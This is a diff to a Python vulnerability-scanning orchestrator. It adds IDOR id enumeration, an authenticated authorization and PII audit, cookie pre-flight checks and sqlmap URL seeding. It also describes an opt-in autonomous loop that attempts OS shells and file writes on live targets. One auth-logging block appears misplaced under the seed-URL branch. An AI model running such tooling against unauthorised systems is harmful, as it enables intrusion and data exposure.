+    """Object-ref PATHS to enumerate for IDOR from urls/with_params.txt.
+
+    Selects query params whose NAME looks like an object id and whose observed VALUE is a
+    positive integer; for each distinct (path, param) emits path?param=1..per_param. The
+    enumeration itself is gated downstream — idor_scanner only flags when >=2 refs return
+    DISTINCT sensitive records — so over-selection here is conservative, not noisy. Pure file read.
+    """
+    from urllib.parse import parse_qsl
+    groups: list[tuple[str, str]] = []
+    seen_groups: set[tuple[str, str]] = set()
+    for u in _collect_urls_from_file(params_file, require_query=True, limit=4000,
+                                     filter_payloads=True):
+        parsed = urlsplit(u)
+        if base_host and parsed.netloc != base_host:
+            continue
+        for k, v in parse_qsl(parsed.query):
+            if not v.isdigit():
+                continue
+            kl = k.lower()
+            if (kl == "id" or kl.endswith(_AUTHZ_ID_SUFFIX)) and (parsed.path, k) not in seen_groups:
+                seen_groups.add((parsed.path, k))
+                groups.append((parsed.path, k))
+        if len(groups) >= max_groups:
+            break
+    refs: list[str] = []
+    for path, param in groups[:max_groups]:
+        for i in range(1, per_param + 1):
+            refs.append(f"{path}?{param}={i}")
+    return refs
+
+
+def _run_authz_audit(domain: str, findings_dir: str, cookie: str) -> int:
+    """Best-effort authenticated authz/disclosure audit → <findings_dir>/authz/findings.json.
+
+    Runs bfla_scanner (forced-browsing BFLA, differential-confirmed against an
+    unauthenticated baseline) + the IDOR/PII detectors over the authenticated session and
+    writes the reporter Method-1f shape that reporter.py Method 1i ingests. This is the
+    authenticated authorization coverage Vikramaditya previously lacked.
+
+    NEVER raises into the pipeline (a network/parse hiccup must not abort report
+    generation). Opt out with VIK_NO_AUTHZ_AUDIT=1. Returns the finding count.
+    """
+    if not cookie or os.environ.get("VIK_NO_AUTHZ_AUDIT"):
+        return 0
+    try:
+        import authz_audit
+        import authz_audit_run
+        base = domain if "://" in str(domain) else f"https://{domain}"
+        base_host = urlsplit(base).netloc
+        get = authz_audit_run.cookie_fetcher(base, cookie)
+        unauth = authz_audit_run.cookie_fetcher(base, "")   # unauthenticated baseline (BFLA confirm)
+        # Feed the audit from the crawl: forced-browsing BFLA over the admin wordlist, PII over
+        # crawled authenticated pages (urls/all.txt), and IDOR enumeration over id-like params
+        # (urls/with_params.txt). All three degrade gracefully when the crawl files are absent.
+        urls_dir = os.path.join(_authz_recon_dir(domain, findings_dir), "urls")
+        page_urls = _authz_select_pages(os.path.join(urls_dir, "all.txt"), base_host)
+        object_refs = _authz_select_object_refs(os.path.join(urls_dir, "with_params.txt"), base_host)
+        findings = authz_audit.audit(get, unauth_get=unauth,
+                                     object_refs=object_refs or None,
+                                     page_urls=page_urls or None)
+        authz_audit.write_findings_json(findings, os.path.join(findings_dir, "authz"))
+        if findings:
+            log("ok", f"Authz audit: {len(findings)} authorization/disclosure finding(s) "
+                      "→ authz/findings.json")
+        return len(findings)
+    except Exception as e:
+        log("warn", f"Authz audit skipped ({str(e)[:80]})")
+        return 0
+
+
 def generate_reports(domain: str) -> int:
     findings_dir = _resolve_findings_dir(domain)
+    # Authenticated authz/IDOR/PII audit — runs BEFORE the reporter reads findings_dir so the
+    # findings fold into the report (Method 1i). Only when a --cookie session was verified.
+    if _AUTHED_COOKIE:
+        _run_authz_audit(domain, findings_dir, _AUTHED_COOKIE)
     if not os.path.isdir(findings_dir):
         log("warn", f"No findings for {domain}")
         return 0
@@ -7275,6 +7996,22 @@ def run_browser_scan(
                 artifacts={"findings": findings_dir},
             )
             return False
+        # v10.6 audit-fix: a PARTIAL phase (some tasks completed, some errored)
+        # returns findings but must NOT render as a clean ✓ — consume the
+        # producer's agent.partial flag and mark the phase degraded so coverage
+        # honestly reflects that some browser tasks failed.
+        if getattr(agent, "partial", False):
+            reason = (f"browser phase partial — {tasks_completed} task(s) completed, "
+                      f"{tasks_errored} errored; findings may be incomplete")
+            _mark_degraded("browser", reason)
+            log("warn", f"Browser scan partial: {reason}")
+            _brain_phase_complete(
+                phase_name, bool(results),
+                detail=(f"target={domain} headed={headed} PARTIAL "
+                        f"completed={tasks_completed} errored={tasks_errored} findings={total}"),
+                artifacts={"findings": findings_dir},
+            )
+            return bool(results)
         log("ok" if total else "info", f"Browser scan complete: {total} finding(s)")
         _brain_phase_complete(
             phase_name,
@@ -7475,7 +8212,7 @@ def hunt_target(
     full: bool = False,
     skip_scan: bool = False,
     scope_lock: bool = False,
-    max_urls: int = 100,
+    max_urls: int = 0,
     targets_file: str | None = None,
     browser_scan: bool = False,
     browser_headed: bool = False,
@@ -7751,6 +8488,15 @@ def hunt_target(
         # v9.24 audit-fix (finding A): a total browser failure records a
         # "browser" degradation; map it so the phase renders ✗ (ERROR), not ✓/∅.
         "browser_scan":    {"browser"},
+        # audit-fix: a watchdog SIGKILL / wall-clock timeout in run_live/run_cmd
+        # records a degradation under the subprocess watch_phase label (e.g.
+        # "RECON", "SCAN"). Map those so a truncated phase renders ⚠/✗ instead
+        # of silently collapsing to "skipped". Match the uppercase watch_phase
+        # labels used at the subprocess call sites.
+        "recon":           {"RECON", "recon"},
+        # the vuln-scan watch_phase label is "VULN SCAN" (and "VULN SCAN (Batch
+        # X/Y)") — NOT "SCAN" — so the degraded-tool match below is prefix-aware.
+        "scan":            {"VULN SCAN", "SCAN", "scan"},
     }
     _phase_requested = {
         "recon":           should_run_recon,
@@ -7771,7 +8517,15 @@ def hunt_target(
     # (a requested browser phase that produced nothing must not be hidden).
     result["phase_requested"] = {k: bool(v) for k, v in _phase_requested.items()}
     for _phase, _requested in _phase_requested.items():
-        _degraded = bool(_phase_tool_map.get(_phase, set()) & _degraded_tools)
+        # Prefix-aware: a degraded tool matches a phase label exactly OR starts
+        # with it (covers dynamic suffixes like "VULN SCAN (Batch 1/3)" that an
+        # exact set-intersection silently missed → scan coverage-loss collapsed
+        # to "skipped" instead of rendering degraded).
+        _labels = _phase_tool_map.get(_phase, set())
+        _degraded = any(
+            _dt == _lab or _dt.upper().startswith(_lab.upper())
+            for _dt in _degraded_tools for _lab in _labels
+        )
         result["phase_status"][_phase] = derive_phase_status(
             bool(_requested), bool(result.get(_phase)), degraded=_degraded
         )
@@ -7931,6 +8685,79 @@ def print_dashboard(results: list) -> None:
 
 
 # ── CLI ────────────────────────────────────────────────────────────────────────
+def _verify_authenticated(target: str, cookie: str) -> tuple[bool, str, str]:
+    """Pre-flight a --cookie session BEFORE the scan: confirm it is actually authenticated,
+    and capture any load-balancer stickiness cookie.
+
+    A bad / expired / wrong cookie otherwise scans the UNAUTHENTICATED surface and reports a
+    false-negative "0 findings" for the whole protected app — and behind an AWS ALB without
+    session stickiness, even a valid login round-robins to a backend that doesn't know the
+    session. Returns (authenticated, reason, extra_cookies_to_append).
+    CONSERVATIVE: declares NOT-authenticated only on STRONG signals (401/403, a login FORM, or
+    a redirect to a login URL) so it never blocks a legitimate authenticated scan.
+    """
+    if not cookie:
+        return True, "no --cookie (unauthenticated scan)", ""
+    t = str(target).strip()
+    url = t if "://" in t else f"https://{t}"           # 'httpbin.org' is NOT pre-schemed
+    try:
+        import requests as _rq
+        try:
+            _rq.packages.urllib3.disable_warnings()
+        except Exception:
+            pass
+        r = _rq.get(url, headers={"User-Agent": "Mozilla/5.0", "Cookie": cookie},
+                    verify=False, timeout=15, allow_redirects=True)
+        # ── Stickiness: harvest from the WHOLE redirect chain (ALB sets it on the 302),
+        # upsert by name (no AWSALB=old; AWSALB=new dupes), reject header-splitting bytes.
+        _STICK = ("AWSALB", "AWSALBCORS", "AWSELB", "ARRAffinity", "ARRAffinitySameSite")
+        _seen: dict = {}
+        for _resp in list(getattr(r, "history", []) or []) + [r]:
+            for _c in _resp.cookies:
+                if _c.name in _STICK and _c.value and not any(b in _c.value for b in "\r\n;"):
+                    _seen[_c.name] = _c.value
+        extra = "; ".join(f"{k}={v}" for k, v in _seen.items())
+        low = (r.text or "")[:300000].lower()
+        ctype = (r.headers.get("Content-Type", "") or "").lower()
+        chain = " ".join([(_h.url or "") for _h in (getattr(r, "history", []) or [])]
+                         + [getattr(r, "url", "") or ""]).lower()
+        # ── Unauthenticated signals (any ONE = not logged in) ──
+        if r.status_code in (401, 403):
+            return False, f"protected page returned HTTP {r.status_code}", extra
+        if r.headers.get("WWW-Authenticate"):
+            return False, "WWW-Authenticate challenge (not authenticated)", extra
+        if "json" in ctype and any(s in low for s in (
+                '"unauthorized"', '"authenticated":false', '"loggedin":false',
+                '"isauthenticated":false', '"error":"unauth', '"code":401', '"status":401')):
+            return False, "API returned an unauthenticated JSON response", extra
+        # redirected THROUGH a login / IdP / SSO URL anywhere in the chain
+        _IDP = ("/login", "/signin", "/sign-in", "/account/login", "/oauth", "/authorize",
+                "/connect/authorize", "/sso", "/adfs", "/saml", "/cas/login",
+                "login.microsoftonline.com", "accounts.google.com", ".okta.com", ".auth0.com")
+        if getattr(r, "history", None) and any(k in chain for k in _IDP):
+            return False, "redirected through a login/IdP URL", extra
+        _mr = re.search(r'http-equiv=["\']refresh["\'][^>]*url=([^"\'>\s]+)', low)
+        if _mr and any(k in _mr.group(1) for k in ("login", "signin", "sso", "authorize")):
+            return False, "meta-refresh to a login page", extra
+        if "your session has expired" in low or "session expired" in low or "please log in" in low:
+            return False, "page indicates the session expired", extra
+        # A LOGIN FORM = password input + login context — UNLESS the page also shows
+        # AUTHENTICATED markers (logout / sign-out), i.e. an authed page that merely contains a
+        # password widget (change-password) — those must NOT be flagged as a login page.
+        has_pw = ('type="password"' in low) or ("type='password'" in low)
+        login_ctx = any(s in low for s in (
+            'name="txtusername"', 'name="username"', 'name="userid"', 'name="loginfmt"',
+            'id="loginform"', 'id="login"', "sign in to", ">login<"))
+        authed_markers = any(s in low for s in (
+            ">logout<", ">log out<", ">sign out<", ">signout<", "/logout", "logoutbutton"))
+        if has_pw and login_ctx and not authed_markers:
+            return False, "session resolves to a LOGIN page (cookie not authenticated)", extra
+        return True, "session authenticated", extra
+    except Exception as e:
+        # Never block on a network/parse hiccup — proceed, but say we couldn't verify.
+        return True, f"pre-flight could not verify ({str(e)[:50]}) — proceeding unverified", ""
+
+
 def main() -> None:
     parser = argparse.ArgumentParser(
         description="VAPT Orchestrator v4",
@@ -8032,8 +8859,8 @@ Examples:
                         help="Allow browser tasks that may submit forms or try default credentials")
     parser.add_argument("--scope-lock",       action="store_true",
                         help="Scope-lock: skip subdomain enumeration entirely — test only the exact --target given (no assetfinder/subfinder/amass/crt.sh)")
-    parser.add_argument("--max-urls",         type=int, default=100, metavar="N",
-                        help="Cap total URLs collected during recon to N (default: 100, priority-ordered: params > JS > API > rest). Use 0 for unlimited.")
+    parser.add_argument("--max-urls",         type=int, default=0, metavar="N",
+                        help="Cap total URLs collected during recon to N (default: 0 = unlimited; priority-ordered: params > JS > API > rest).")
     parser.add_argument("--skip",             action="append", default=[],
                         help="Skip phases/checks. Repeat or comma-separate values, e.g. --skip xss,sqli or --skip api --skip rce")
     parser.add_argument("--semgrep",          type=str, metavar="SOURCE_DIR",
@@ -8052,6 +8879,10 @@ Examples:
                         help="Use real LangGraph backend for agent mode (requires pip install langgraph langchain-ollama)")
     parser.add_argument("--request-file",     type=str, metavar="PATH",
                         help="Raw HTTP request file (Burp export) — runs sqlmap -r directly")
+    parser.add_argument("--seed-urls",        type=str, default="", metavar="PATH_OR_LIST",
+                        help="Seed specific parameterized URLs (file with one URL/line, or a "
+                             "comma-separated list) into the sqli/param test set — for WebForms "
+                             "(__doPostBack) / SPA apps whose GET endpoints the crawl can't find")
     parser.add_argument("--post-params",      action="store_true",
                         help="Run POST parameter discovery (katana forms + arjun POST) on target")
     parser.add_argument("--cookie",           type=str, default="",
@@ -8078,6 +8909,44 @@ Examples:
                              "OFF by default — opt in deliberately.")
 
     args = parser.parse_args()
+
+    # ── Authenticated-session pre-flight (gap fix #2/#3) ──────────────────────
+    # Placed BEFORE any mode dispatch (--post-params etc. early-return below) so an
+    # authenticated run never silently scans the UNAUTHENTICATED surface. A --cookie that
+    # isn't actually logged in (expired/wrong, or lost behind a stickiness-less load
+    # balancer) otherwise reports false-negative "0 findings" for the protected app. Verify
+    # up-front, pin any LB stickiness cookie, FLAG (not abort) so a heuristic miss never
+    # blocks a legitimate scan while the report records the coverage as unreliable.
+    if getattr(args, "cookie", "") and getattr(args, "target", ""):
+        _authed, _why, _stick = _verify_authenticated(args.target, args.cookie)
+        if _stick:
+            args.cookie = args.cookie.rstrip("; ") + "; " + _stick
+            log("info", "Captured load-balancer stickiness cookie — session pinned to one backend")
+        # Hand the verified session (incl. stickiness) to generate_reports so it can run the
+        # authenticated authz/IDOR/PII audit without threading the cookie through the pipeline.
+        global _AUTHED_COOKIE
+        _AUTHED_COOKIE = args.cookie
+    # --seed-urls: parse once; run_sqlmap_targeted seeds them into the session's candidate set.
+    global _SEED_URLS
+    _SEED_URLS = _parse_seed_urls(getattr(args, "seed_urls", ""))
+    if _SEED_URLS:
+        log("info", f"--seed-urls: {len(_SEED_URLS)} URL(s) will be added to the sqli/param test set")
+        if _authed:
+            log("ok", f"Auth pre-flight: {_why}")
+        else:
+            log("warn", f"AUTH PRE-FLIGHT FAILED — {_why}. The --cookie session is NOT "
+                        "authenticated; this run would test the UNAUTHENTICATED surface and "
+                        "report false-negative '0 findings' for protected pages. Re-capture a "
+                        "valid session cookie and re-run.")
+            _mark_degraded("auth", f"--cookie session not authenticated ({_why}); authenticated "
+                           "coverage is UNRELIABLE — do NOT read '0 findings' as a clean result")
+
+    # SECURITY GATE: the brain's AUTONOMOUS exploit loop (auto_triage_and_exploit, reached via
+    # post_scan_hook on every confirmed SQLi) issues model-driven --os-shell/--file-write at the
+    # live target. Gate it behind the same --sqli-rce opt-in as the request-file escalation; OFF
+    # by default so a normal scan never autonomously attempts RCE/webshell against production.
+    if _brain is not None:
+        _brain.allow_exploit = bool(getattr(args, "sqli_rce", False))
     resume_requested = args.resume is not None
     resume_session_id = None if args.resume in (None, "", "latest") else args.resume
     skip_items = parse_skip_items(args.skip)
